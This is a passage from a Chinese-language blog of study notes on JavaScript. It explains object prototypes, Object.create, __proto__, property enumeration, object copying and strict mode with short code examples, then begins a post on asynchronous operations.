<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123; <span class="attr">p</span>: <span class="number">1</span> &#125;;</span><br><span class="line"><span class="keyword">var</span> obj2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(obj1);</span><br><span class="line"></span><br><span class="line">obj1.<span class="property">p</span> = <span class="number">2</span>;</span><br><span class="line">obj2.<span class="property">p</span> <span class="comment">// 2  obj2的原型指向obj1，当访问obj2上的p属性时，js引擎会先在obj2本身上找，没找到会去原型上找</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，修改对象原型<code>obj1</code>会影响到实例对象<code>obj2</code>。</p>
<p> 除了对象的原型，<code>Object.create</code>方法还可以接受<strong>第二个参数。该参数是一个属性描述对象，它所描述的对象属性，会添加到实例对象，作为该对象自身的属性</strong>。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(&#123;&#125;, &#123;</span><br><span class="line">  <span class="attr">p1</span>: &#123; <span class="comment">// p1为添加到obj实例对象自身的属性</span></span><br><span class="line">    <span class="attr">value</span>: <span class="number">123</span>,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">p2</span>: &#123;</span><br><span class="line">    <span class="attr">value</span>: <span class="string">&#x27;abc&#x27;</span>,</span><br><span class="line">    <span class="attr">enumerable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">configurable</span>: <span class="literal">true</span>,</span><br><span class="line">    <span class="attr">writable</span>: <span class="literal">true</span>,</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(&#123;&#125;);</span><br><span class="line">obj.<span class="property">p1</span> = <span class="number">123</span>;</span><br><span class="line">obj.<span class="property">p2</span> = <span class="string">&#x27;abc&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p><code>Object.create</code>方法生成的对象，<strong>继承了它的原型对象的构造函数</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">A</span>(<span class="params"></span>) &#123;&#125;</span><br><span class="line"><span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"><span class="keyword">var</span> b = <span class="title class_">Object</span>.<span class="title function_">create</span>(a);</span><br><span class="line"></span><br><span class="line">b.<span class="property">constructor</span> === A <span class="comment">// true</span></span><br><span class="line">b <span class="keyword">instanceof</span> A <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>b</code>对象的原型是<code>a</code>对象，因此继承了<code>a</code>对象的构造函数<code>A</code>。</p>
<h3 id="4、Object-prototype-isPrototypeOf-判断某个对象是否为参数对象的原型"><a href="#4、Object-prototype-isPrototypeOf-判断某个对象是否为参数对象的原型" class="headerlink" title="4、Object.prototype.isPrototypeOf()判断某个对象是否为参数对象的原型"></a>4、Object.prototype.isPrototypeOf()判断某个对象是否为参数对象的原型</h3><p>实例对象的<code>isPrototypeOf</code>方法，用来<strong>判断该对象是否为参数对象的原型</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> o2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(o1);</span><br><span class="line"><span class="keyword">var</span> o3 = <span class="title class_">Object</span>.<span class="title function_">create</span>(o2);</span><br><span class="line"></span><br><span class="line">o2.<span class="title function_">isPrototypeOf</span>(o3) <span class="comment">// true  判断o2是否为o3的原型</span></span><br><span class="line">o1.<span class="title function_">isPrototypeOf</span>(o3) <span class="comment">// true  判断o1是否为o3的原型</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>o1</code>和<code>o2</code>都是<code>o3</code>的原型。这表明只要实例对象处在参数对象的原型链上，<code>isPrototypeOf</code>方法都返回<code>true</code>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(&#123;&#125;) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>([]) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(<span class="regexp">/xyz/</span>) <span class="comment">// true</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span>.<span class="title function_">isPrototypeOf</span>(<span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>)) <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，由于<code>Object.prototype</code>处于原型链的最顶端，所以对各种实例都返回<code>true</code>，只有直接继承自<code>null</code>的对象除外。</p>
<h3 id="5、Object-prototype-proto-返回该对象的原型，可读写"><a href="#5、Object-prototype-proto-返回该对象的原型，可读写" class="headerlink" title="5、Object.prototype.__proto__ 返回该对象的原型，可读写"></a>5、Object.prototype.__proto__ 返回该对象的原型，可读写</h3><p> 实例对象的<code>__proto__</code><strong>属性</strong>（前后各两个下划线），<strong>返回该对象的原型。该属性可读写</strong>。 </p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="title class_">Object</span>.<span class="title function_">create</span>(&#123;<span class="attr">x</span>:<span class="number">1</span>&#125;) <span class="comment">// 创建实例对象obj，其原型指定为&#123;x:1&#125;</span></span><br><span class="line">obj.<span class="property">__proto__</span> <span class="comment">// &#123;x: 1&#125;  实例对象obj的__proto__属性，返回obj的原型</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj) <span class="comment">// &#123;x: 1&#125;</span></span><br></pre></td></tr></table></figure>

<p>上面代码通过<code>Object.create</code>创建实例对象obj，指定其原型为<code>&#123;x:1&#125;</code>，访问obj对象的<code>__proto__</code>属性，返回其原型。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> p = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">obj.<span class="property">__proto__</span> = p; <span class="comment">// 原型属性可读写</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj) === p <span class="comment">// true</span></span><br><span class="line">obj.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj) <span class="comment">//true</span></span><br></pre></td></tr></table></figure>

<p>上面代码通过<code>__proto__</code>属性，将<code>p</code>对象设为<code>obj</code>对象的原型。</p>
<p> 根据语言标准，<code>__proto__</code>属性只有浏览器才需要部署，其他环境可以没有这个属性。它前后的两根下划线，表明它本质是一个内部属性，不应该对使用者暴露。<strong>因此，应该尽量少用这个属性，而是用<code>Object.getPrototypeOf()</code>和<code>Object.setPrototypeOf()</code>，进行原型对象的读写操作</strong>。 </p>
<p>原型链可以用<code>__proto__</code>很直观地表示。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> A = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> B = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;李四&#x27;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> proto = &#123;</span><br><span class="line">  <span class="attr">print</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">name</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">A.<span class="property">__proto__</span> = proto; <span class="comment">// 将A的原型指向proto对象</span></span><br><span class="line">B.<span class="property">__proto__</span> = proto; <span class="comment">// 将B的原型指向proto对象</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 共享print方法，都是在调用proto对象内的print方法</span></span><br><span class="line">A.<span class="title function_">print</span>() <span class="comment">// 张三</span></span><br><span class="line">B.<span class="title function_">print</span>() <span class="comment">// 李四</span></span><br><span class="line"></span><br><span class="line">A.<span class="property">print</span> === B.<span class="property">print</span> <span class="comment">// true</span></span><br><span class="line">A.<span class="property">print</span> === proto.<span class="property">print</span> <span class="comment">// true</span></span><br><span class="line">B.<span class="property">print</span> === proto.<span class="property">print</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>A</code>对象和<code>B</code>对象的原型都是<code>proto</code>对象，它们都共享<code>proto</code>对象的<code>print</code>方法。也就是说，<code>A</code>和<code>B</code>的<code>print</code>方法，都是在调用<code>proto</code>对象的<code>print</code>方法。</p>
<h3 id="6、获取原型对象方法的比较"><a href="#6、获取原型对象方法的比较" class="headerlink" title="6、获取原型对象方法的比较"></a>6、获取原型对象方法的比较</h3><p>如前所述，<code>__proto__</code>属性指向当前对象的原型对象，即构造函数的<code>prototype</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj = <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">obj.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="comment">// true</span></span><br><span class="line">obj.<span class="property">__proto__</span> === obj.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span></span><br><span class="line"><span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>上面代码首先新建了一个对象<code>obj</code>，它的<code>__proto__</code>属性，指向构造函数（<code>Object</code>或<code>obj.constructor</code>）的<code>prototype</code>属性。</p>
<p>因此，获取实例对象<code>obj</code>的原型对象，有三种方法。</p>
<ul>
<li><code>obj.__proto__</code></li>
<li><code>obj.constructor.prototype</code></li>
<li><code>Object.getPrototypeOf(obj)</code></li>
</ul>
<p>上面三种方法之中，前两种都不是很可靠。<code>__proto__</code>属性只有浏览器才需要部署，其他环境可以不部署。而<code>obj.constructor.prototype</code>在手动改变原型对象时，可能会失效。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> P = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> p = <span class="keyword">new</span> <span class="title function_">P</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> C = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line">C.<span class="property"><span class="keyword">prototype</span></span> = p;</span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line"></span><br><span class="line">c.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> === p <span class="comment">// false</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，构造函数<code>C</code>的原型对象被改成了<code>p</code>，但是实例对象的<code>c.constructor.prototype</code>却没有指向<code>p</code>。所以，在改变原型对象时，一般要同时设置<code>constructor</code>属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C.<span class="property"><span class="keyword">prototype</span></span> = p;</span><br><span class="line">C.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">constructor</span> = C; <span class="comment">// 如在构造函数的继承中就使用到这个操作</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title function_">C</span>();</span><br><span class="line">c.<span class="property">constructor</span>.<span class="property"><span class="keyword">prototype</span></span> === p <span class="comment">// true  </span></span><br></pre></td></tr></table></figure>

<p>因此，<strong>推荐使用第三种<code>Object.getPrototypeOf</code>方法，获取原型对象</strong>。</p>
<h3 id="7、Object-getOwnPropertyNames"><a href="#7、Object-getOwnPropertyNames" class="headerlink" title="7、Object.getOwnPropertyNames()"></a>7、Object.getOwnPropertyNames()</h3><p><code>Object.getOwnPropertyNames</code>方法<strong>返回一个数组，成员是参数对象本身的所有属性的键名，不包含继承的属性键名</strong>。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(<span class="title class_">Date</span>)</span><br><span class="line"><span class="comment">// [&quot;parse&quot;, &quot;arguments&quot;, &quot;UTC&quot;, &quot;caller&quot;, &quot;name&quot;, &quot;prototype&quot;, &quot;now&quot;, &quot;length&quot;]</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，<code>Object.getOwnPropertyNames</code>方法返回<code>Date</code>所有自身的属性名。</p>
<p>对象本身的属性之中，有的是可以遍历的（enumerable），有的是不可以遍历的。<code>Object.getOwnPropertyNames</code>方法返回所有键名，不管是否可以遍历。只获取那些可以遍历的属性，使用<code>Object.keys</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(<span class="title class_">Date</span>) <span class="comment">// []</span></span><br></pre></td></tr></table></figure>

<p>上面代码表明，<code>Date</code>对象所有自身的属性，都是不可以遍历的。</p>
<h3 id="8、Object-prototype-hasOwnProperty"><a href="#8、Object-prototype-hasOwnProperty" class="headerlink" title="8、Object.prototype.hasOwnProperty()"></a>8、Object.prototype.hasOwnProperty()</h3><p>对象实例的<code>hasOwnProperty</code>方法返回一个布尔值，用于<strong>判断某个属性定义在对象自身，还是定义在原型链上</strong>。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Date.hasOwnProperty(&#x27;length&#x27;) // true</span><br><span class="line">Date.hasOwnProperty(&#x27;toString&#x27;) // false</span><br></pre></td></tr></table></figure>

<p>上面代码表明，<code>Date.length</code>（构造函数<code>Date</code>可以接受多少个参数）是<code>Date</code>自身的属性，<code>Date.toString</code>是继承的属性。</p>
<p>另外，<code>hasOwnProperty</code>方法是 JavaScript 之中唯一一个处理对象属性时，不会遍历原型链的方法。</p>
<h3 id="9、in-运算符和-for…in-循环"><a href="#9、in-运算符和-for…in-循环" class="headerlink" title="9、in 运算符和 for…in 循环"></a>9、in 运算符和 for…in 循环</h3><p><code>in</code>运算符<strong>返回一个布尔值，表示一个对象是否具有某个属性</strong>。它不区分该属性是对象自身的属性，还是继承的属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;length&#x27;</span> <span class="keyword">in</span> <span class="title class_">Date</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&#x27;toString&#x27;</span> <span class="keyword">in</span> <span class="title class_">Date</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p><code>in</code>运算符常用于检查一个属性是否存在。</p>
<p>获得对象的所有可遍历属性（不管是自身的还是继承的），可以使用<code>for...in</code>循环。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> o1 = &#123; <span class="attr">p1</span>: <span class="number">123</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> o2 = <span class="title class_">Object</span>.<span class="title function_">create</span>(o1, &#123; <span class="comment">// o2的原型指向o1，并且在o2上定义一个属性p2</span></span><br><span class="line">  <span class="attr">p2</span>: &#123; <span class="attr">value</span>: <span class="string">&quot;abc&quot;</span>, <span class="attr">enumerable</span>: <span class="literal">true</span> &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (p <span class="keyword">in</span> o2) &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">info</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// p2  </span></span><br><span class="line"><span class="comment">// p1    继承的属性</span></span><br></pre></td></tr></table></figure>

<p>上面代码中，对象<code>o2</code>的<code>p2</code>属性是自身的，<code>p1</code>属性是继承的。这两个属性都会被<code>for...in</code>循环遍历。</p>
<p>为了在<code>for...in</code>循环中获得对象自身的属性，可以采用<code>hasOwnProperty</code>方法判断一下。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> name <span class="keyword">in</span> object ) &#123;</span><br><span class="line">  <span class="keyword">if</span> ( object.<span class="title function_">hasOwnProperty</span>(name) ) &#123; <span class="comment">// 过滤掉非自身的属性</span></span><br><span class="line">    <span class="comment">/* loop code */</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>获得对象的所有属性（不管是自身的还是继承的，也不管是否可枚举）</strong>，可以使用下面的函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">inheritedPropertyNames</span>(<span class="params">obj</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> props = &#123;&#125;;</span><br><span class="line">  <span class="keyword">while</span>(obj) &#123;</span><br><span class="line">     <span class="comment">// 获取obj对象的所有属性，包括不可枚举的，</span></span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(obj).<span class="title function_">forEach</span>(<span class="keyword">function</span>(<span class="params">p</span>) &#123;</span><br><span class="line">      props[p] = <span class="literal">true</span>;</span><br><span class="line">    &#125;);</span><br><span class="line">    obj = <span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(obj); <span class="comment">// 获取对象的原型</span></span><br><span class="line">  &#125;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(props)</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyNames</span>(props);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面代码依次获取<code>obj</code>对象的每一级原型对象“自身”的属性，从而获取<code>obj</code>对象的“所有”属性，不管是否可遍历。</p>
<p>下面是一个例子，列出<code>Date</code>对象的所有属性。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">inheritedPropertyNames</span>(<span class="title class_">Date</span>)</span><br><span class="line"><span class="comment">// [</span></span><br><span class="line"><span class="comment">//  &quot;caller&quot;,</span></span><br><span class="line"><span class="comment">//  &quot;constructor&quot;,</span></span><br><span class="line"><span class="comment">//  &quot;toString&quot;,</span></span><br><span class="line"><span class="comment">//  &quot;UTC&quot;,</span></span><br><span class="line"><span class="comment">//  ...</span></span><br><span class="line"><span class="comment">// ]</span></span><br></pre></td></tr></table></figure>

<h3 id="10、对象的拷贝"><a href="#10、对象的拷贝" class="headerlink" title="10、对象的拷贝"></a>10、对象的拷贝</h3><p>如果要拷贝一个对象，需要做到下面两件事情。</p>
<ul>
<li>确保拷贝后的对象，与原对象具有同样的原型。</li>
<li>确保拷贝后的对象，与原对象具有同样的实例属性。</li>
</ul>
<p>下面就是根据上面两点，实现的对象拷贝函数。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyObject</span>(<span class="params">orig</span>) &#123; <span class="comment">// 拷贝对象函数</span></span><br><span class="line">    <span class="comment">// 创建一个新对象，新对象的原型指向旧对象的原型</span></span><br><span class="line">  <span class="keyword">var</span> copy = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(orig)); </span><br><span class="line">  <span class="title function_">copyOwnPropertiesFrom</span>(copy, orig);</span><br><span class="line">  <span class="keyword">return</span> copy;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">copyOwnPropertiesFrom</span>(<span class="params">target, source</span>) &#123; <span class="comment">// 拷贝旧对象的实例属性</span></span><br><span class="line">  <span class="title class_">Object</span></span><br><span class="line">    .<span class="title function_">getOwnPropertyNames</span>(source)</span><br><span class="line">    .<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">propKey</span>) &#123;</span><br><span class="line">      <span class="comment">// 获取每个属性的 属性描述对象</span></span><br><span class="line">      <span class="keyword">var</span> desc = <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptor</span>(source, propKey);</span><br><span class="line">      <span class="comment">// 定义属性，给target对象定义propKey属性，其属性描述对象是desc</span></span><br><span class="line">      <span class="title class_">Object</span>.<span class="title function_">defineProperty</span>(target, propKey, desc);</span><br><span class="line">    &#125;);</span><br><span class="line">  <span class="keyword">return</span> target;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>另一种更简单的写法，是利用 ES2017 才引入标准的<code>Object.getOwnPropertyDescriptors</code>方法。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copyObject</span>(<span class="params">orig</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="title class_">Object</span>.<span class="title function_">create</span>(</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">getPrototypeOf</span>(orig),</span><br><span class="line">    <span class="title class_">Object</span>.<span class="title function_">getOwnPropertyDescriptors</span>(orig)</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="五、严格模式"><a href="#五、严格模式" class="headerlink" title="五、严格模式"></a>五、严格模式</h2><p>除了正常的运行模式，JavaScript 还有第二种运行模式：严格模式（strict mode）。顾名思义，这种模式采用更加严格的 JavaScript 语法。</p>
<p>同样的代码，在正常模式和严格模式中，可能会有不一样的运行结果。一些在正常模式下可以运行的语句，在严格模式下将不能运行。</p>
<h3 id="1、设计目的"><a href="#1、设计目的" class="headerlink" title="1、设计目的"></a>1、设计目的</h3><p>早期的 JavaScript 语言有很多设计不合理的地方，但是为了兼容以前的代码，又不能改变老的语法，只能不断添加新的语法，引导程序员使用新语法。</p>
<p>严格模式是从 ES5 进入标准的，主要目的有以下几个。</p>
<ul>
<li>明确禁止一些不合理、不严谨的语法，减少 JavaScript 语言的一些怪异行为。</li>
<li>增加更多报错的场合，消除代码运行的一些不安全之处，保证代码运行的安全。</li>
<li>提高编译器效率，增加运行速度。</li>
<li>为未来新版本的 JavaScript 语法做好铺垫。</li>
</ul>
<p>总之，严格模式体现了 JavaScript 更合理、更安全、更严谨的发展方向。</p>
<h3 id="2、启用方法"><a href="#2、启用方法" class="headerlink" title="2、启用方法"></a>2、启用方法</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&#x27;use strict&#x27;</span>;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>更多关于严格模式内容：<a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/oop/strict.html">https://wangdoc.com/javascript/oop/strict.html</a></p>
</blockquote>
<h2 id="文档"><a href="#文档" class="headerlink" title="文档"></a>文档</h2><p>学习文档：<a target="_blank" rel="noopener" href="https://wangdoc.com/javascript/">https://wangdoc.com/javascript/</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/pages/659b5af5e2e704e0" data-id="cm2n1iusr00079sr38n7hfuqb" data-title="面向对象" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-04.异步操作" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/pages/d61b1cb4cdac1f63" class="article-date">
  <time class="dt-published" datetime="2020-01-12T03:49:16.000Z" itemprop="datePublished">2020-01-12</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E3%80%8AJavaScript%E6%95%99%E7%A8%8B%E3%80%8B%E7%AC%94%E8%AE%B0/">《JavaScript教程》笔记</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/pages/d61b1cb4cdac1f63">异步操作</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="异步操作"><a href="#异步操作" class="headerlink" title="异步操作"></a>异步操作</h1><h2 id="一、异步操作概述"><a href="#一、异步操作概述" class="headerlink" title="一、异步操作概述"></a>一、异步操作概述</h2><h3 id="1、单线程模型"><a href="#1、单线程模型" class="headerlink" title="1、单线程模型"></a>1、单线程模型</h3><p>单线程模型指的是，<strong>JavaScript 只在一个线程上运行</strong>。也就是说，<strong>JavaScript 同时只能执行一个任务</strong>，其他任务都必须在后面排队等待。</p>
<p>注意，<strong>JavaScript 只在一个线程上运行，不代表 JavaScript 引擎只有一个线程</strong>。事实上，JavaScript 引擎有多个线程，单个脚本只能在一个线程上运行（称为主线程），其他线程都是在后台配合。</p>
<p>JavaScript 之所以采用单线程，而不是多线程，跟历史有关系。JavaScript 从诞生起就是单线程，原因是不想让浏览器变得太复杂，因为多线程需要共享资源、且有可能修改彼此的运行结果，对于一种网页脚本语言来说，这就太复杂了。如果 JavaScript 同时有两个线程，一个线程在网页 DOM 节点上添加内容，另一个线程删除了这个节点，这时浏览器应该以哪个线程为准？是不是还要有锁机制？所以，<strong>为了避免复杂性</strong>，<strong>JavaScript 一开始就是单线程</strong>，这已经成了这门语言的核心特征，将来也不会改变。</p>
